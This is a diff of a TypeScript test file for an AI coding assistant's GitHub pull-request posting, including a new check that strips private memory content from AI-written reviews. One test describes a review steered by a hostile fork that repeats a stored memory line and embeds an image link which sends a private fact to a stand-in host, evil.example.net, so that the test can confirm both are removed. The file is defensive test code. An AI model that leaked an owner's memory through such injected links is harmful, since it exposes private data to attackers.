@@ -2,9 +2,11 @@ import { mkdtemp, rm } from "node:fs/promises"
 import { tmpdir } from "node:os"
 import { join } from "node:path"
 
-import { afterAll, describe, expect, test } from "bun:test"
+import { afterAll, beforeAll, describe, expect, test } from "bun:test"
+import { BrainPosting } from "@vectordevai/core/brain/posting"
 import { buildWorkflowYaml } from "@vectordevai/core/review/workflow"
 
+import { createPullRequest as createWorkspacePullRequest } from "./github"
 import type { GithubAccess } from "./github-api"
 import {
   AUTO_REVIEW_BRANCH,
@@ -20,7 +22,9 @@ import {
   putPullRequestMerge,
   setUpAutomaticReviews,
   submitPullRequestReview,
+  type ReviewCheck,
 } from "./github-pr"
+import { checkPost, usePostingEngine, type Ask } from "./posting-check"
 
 // A small stand-in for api.github.com that answers the calls the Pull Requests panel makes, so the real request,
 // pagination and error code runs end to end without a network or a token.
@@ -180,6 +184,10 @@ afterAll(() => server.stop(true))
 
 const access: GithubAccess = { token: "test-token", source: "vector", apiUrl: `http://127.0.0.1:${server.port}` }
 const repo = { owner: "acme", name: "app" }
+// The posting check as a review that passed it: every part sent as it was.
+const same: ReviewCheck = (parts) => Promise.resolve(parts)
+const postWith = (check: ReviewCheck, review: Parameters<typeof postPullRequestReview>[3]) =>
+  postPullRequestReview(access, repo, 7, review, check)
 
 describe("pull requests over GitHub's API", () => {
   test("lists pull requests across pages up to the limit, with the fields the panel shows", async () => {
@@ -201,7 +209,7 @@ describe("pull requests over GitHub's API", () => {
 
   test("posts a review pinned to the commit it ran on", async () => {
     requests.length = 0
-    await postPullRequestReview(access, repo, 7, { body: "Two findings", event: "request-changes", head: HEAD })
+    await postWith(same, { body: "Two findings", event: "request-changes", head: HEAD })
     const posted = requests.find((request) => request.path.endsWith("/reviews"))
     expect(posted?.body).toEqual({ body: "Two findings", event: "REQUEST_CHANGES", commit_id: HEAD })
   })
@@ -210,7 +218,7 @@ describe("pull requests over GitHub's API", () => {
     requests.length = 0
     const stale = "c".repeat(40)
     await expect(
-      postPullRequestReview(access, repo, 7, { body: "LGTM", event: "approve", head: stale }),
+      postWith(same, { body: "LGTM", event: "approve", head: stale }),
     ).rejects.toThrow("changed after the review started")
     expect(requests.some((request) => request.path.endsWith("/reviews"))).toBe(false)
   })
@@ -223,7 +231,7 @@ describe("pull requests over GitHub's API", () => {
       { path: "b.ts", line: 2, side: "LEFT" as const, startLine: 2, body: "The removed guard was needed" },
     ]
     expect(
-      await postPullRequestReview(access, repo, 7, { body: "Three findings", event: "comment", head: HEAD, comments }),
+      await postWith(same, { body: "Three findings", event: "comment", head: HEAD, comments }),
     ).toEqual({ posted: true, inline: 3 })
     expect(requests.find((request) => request.path.endsWith("/reviews"))?.body).toEqual({
       body: "Three findings",
@@ -246,7 +254,7 @@ describe("pull requests over GitHub's API", () => {
     // Without the commit they were read on, line numbers could point anywhere, so the comments are left out.
     requests.length = 0
     expect(
-      await postPullRequestReview(access, repo, 7, { body: "Three findings", event: "comment", comments }),
+      await postWith(same, { body: "Three findings", event: "comment", comments }),
     ).toEqual({ posted: true, inline: 0 })
     expect(requests.find((request) => request.path.endsWith("/reviews"))?.body).toEqual({
       body: "Three findings",
@@ -262,7 +270,7 @@ describe("pull requests over GitHub's API", () => {
     ]
     const fallbackBody = "Two findings\n\n- a.ts:4 Off by one\n- a.ts:900 Outside the diff"
     expect(
-      await postPullRequestReview(access, repo, 7, {
+      await postWith(same, {
         body: "Two findings",
         event: "comment",
         head: HEAD,
@@ -278,7 +286,7 @@ describe("pull requests over GitHub's API", () => {
     // Only once: a fallback GitHub refuses too is reported, not retried.
     requests.length = 0
     await expect(
-      postPullRequestReview(access, repo, 7, {
+      postWith(same, {
         body: "Two findings",
         event: "comment",
         head: HEAD,
@@ -677,5 +685,141 @@ describe("pushedHead", () => {
     const local = await repository({ origin: "https://github.com/acme/app.git" }, "")
     await expect(pushedHead(local, repo)).rejects.toThrow("Push this branch to GitHub first")
     await rm(local, { recursive: true, force: true })
+  })
+})
+
+// The posting check (section 6.4a) through a stand-in for the engine's owner-only route on loopback, which runs the
+// real check over a fixed memory, and a stand-in for the owner's answers to Vector's questions.
+describe("the posting check before Vector posts", () => {
+  const FACT = "Acme drops the Q3 platform contract with Globex after the audit in March"
+  const HABIT = "Prefer small pull requests with one reviewer and squash merges for every change"
+  const checks: { directory: string | null; body: Record<string, unknown> }[] = []
+  const questions: Parameters<Ask>[0][] = []
+  const answers: number[] = []
+  const engine = Bun.serve({
+    port: 0,
+    hostname: "127.0.0.1",
+    async fetch(request) {
+      const url = new URL(request.url)
+      if (request.method !== "POST" || url.pathname !== "/memory/posting-check") return new Response("", { status: 404 })
+      if (request.headers.get("authorization") !== `Basic ${Buffer.from("vector:engine-secret").toString("base64")}`)
+        return new Response("", { status: 401 })
+      const body = (await request.json()) as { parts: string[]; typed: boolean; untrusted?: boolean }
+      checks.push({ directory: url.searchParams.get("directory"), body })
+      return Response.json(
+        BrainPosting.check({ ...body, memory: { habits: [HABIT], facts: [FACT] }, known: new Set<string>() }),
+      )
+    },
+  })
+  const reachable = async () => ({ url: `http://127.0.0.1:${engine.port}`, username: "vector", password: "engine-secret" })
+  const ask: Ask = async (question) => {
+    questions.push(question)
+    return answers.shift() ?? question.cancel
+  }
+  const review = (parts: string[]) => checkPost({ cwd: "/repo", parts, typed: false, sessionIDs: ["ses_review"], untrusted: true })
+  const reset = () => {
+    requests.length = 0
+    checks.length = 0
+    questions.length = 0
+    answers.length = 0
+  }
+  beforeAll(() => usePostingEngine(reachable, ask))
+  afterAll(() => engine.stop(true))
+
+  test("a review is checked as one text, so a memory sentence split across two line comments is taken out", async () => {
+    reset()
+    answers.push(0)
+    const comments = [
+      { path: "a.ts", line: 4, side: "RIGHT" as const, body: "The handler looks right. Acme drops the Q3" },
+      { path: "a.ts", line: 9, side: "RIGHT" as const, body: "platform contract with Globex. Fix the guard." },
+    ]
+    expect(await postWith(review, { body: "Two findings", event: "comment", head: HEAD, comments })).toEqual({
+      posted: true,
+      inline: 2,
+    })
+    expect(checks[0]).toMatchObject({ directory: "/repo", body: { typed: false, sessionIDs: ["ses_review"], untrusted: true } })
+    expect(questions[0]).toMatchObject({ buttons: ["Post without them", "Post as is", "Cancel"] })
+    expect(questions[0]?.detail).toContain("Acme drops the Q3")
+    const posted = requests.find((request) => request.path.endsWith("/reviews"))?.body as {
+      comments: { body: string }[]
+    }
+    expect(posted.comments.map((comment) => comment.body)).toEqual(["The handler looks right.", "Fix the guard."])
+  })
+
+  test("a review a hostile fork steered carries no memory line, and its images and links point only at GitHub", async () => {
+    reset()
+    answers.push(0)
+    const body = [
+      "As your memory says: Prefer small pull requests with one reviewer and squash merges for every change.",
+      `![status](https://evil.example.net/p.png?m=${encodeURIComponent(FACT)}) See [the run](https://github.com/acme/app/actions/runs/1).`,
+      "The retry loop never stops.",
+    ].join("\n")
+    expect(await postWith(review, { body, event: "comment", head: HEAD })).toEqual({ posted: true, inline: 0 })
+    const posted = String(requests.find((request) => request.path.endsWith("/reviews"))?.body?.body)
+    expect(posted).not.toContain("squash merges")
+    expect(posted).not.toContain("Globex")
+    expect(posted).not.toContain("evil.example.net")
+    expect(posted).toContain("https://github.com/acme/app/actions/runs/1")
+    expect(posted).toContain("The retry loop never stops.")
+  })
+
+  test("Cancel posts nothing, and Post as is posts the review the reviewers wrote", async () => {
+    reset()
+    answers.push(2)
+    const body = `Found one issue. ${FACT}.`
+    expect(await postWith(review, { body, event: "comment", head: HEAD })).toEqual({ posted: false, inline: 0 })
+    expect(requests.some((request) => request.path.endsWith("/reviews"))).toBe(false)
+    answers.push(1)
+    await postWith(review, { body, event: "comment", head: HEAD })
+    expect(requests.find((request) => request.path.endsWith("/reviews"))?.body?.body).toBe(body)
+  })
+
+  test("with the engine out of reach, nothing is posted unless the owner says to post anyway", async () => {
+    reset()
+    usePostingEngine(async () => ({ url: "http://127.0.0.1:9", username: "vector", password: "engine-secret" }))
+    try {
+      expect(await postWith(review, { body: "One finding", event: "comment", head: HEAD })).toEqual({
+        posted: false,
+        inline: 0,
+      })
+      expect(questions[0]?.message).toBe("Vector could not check this text against your memory. Post anyway?")
+      expect(questions[0]?.default).toBe(1)
+      expect(requests.some((request) => request.path.endsWith("/reviews"))).toBe(false)
+      answers.push(0)
+      expect(await postWith(review, { body: "One finding", event: "comment", head: HEAD })).toEqual({
+        posted: true,
+        inline: 0,
+      })
+    } finally {
+      usePostingEngine(reachable)
+    }
+  })
+
+  test("text the user typed, such as a commit message, is asked about and never changed", async () => {
+    reset()
+    const typed = [`Release prep. ${FACT}.`]
+    expect(await checkPost({ cwd: "/repo", parts: typed, typed: true })).toBeUndefined()
+    expect(questions[0]).toMatchObject({ buttons: ["Post as is", "Cancel"], default: 1 })
+    answers.push(0)
+    expect(await checkPost({ cwd: "/repo", parts: typed, typed: true })).toEqual(typed)
+    expect(await checkPost({ cwd: "/repo", parts: ["Fix the retry loop"], typed: true })).toEqual(["Fix the retry loop"])
+    expect(questions).toHaveLength(2)
+  })
+
+  test("a Parallel Workspace pull request is checked, body and task included, before anything is committed", async () => {
+    reset()
+    const dir = await mkdtemp(join(tmpdir(), "vector-workspace-"))
+    try {
+      const result = await createWorkspacePullRequest({
+        projectPath: dir,
+        title: "Retry fix",
+        body: `Fixed the retry loop.\n\nVector task: ${FACT}`,
+      })
+      expect(result).toEqual({ ok: false, log: "", error: "Nothing was posted." })
+      expect(checks[0]?.body.parts).toEqual(["Retry fix", `Fixed the retry loop.\n\nVector task: ${FACT}`])
+      expect(checks[0]?.body.typed).toBe(false)
+    } finally {
+      await rm(dir, { recursive: true, force: true })
+    }
   })
 })
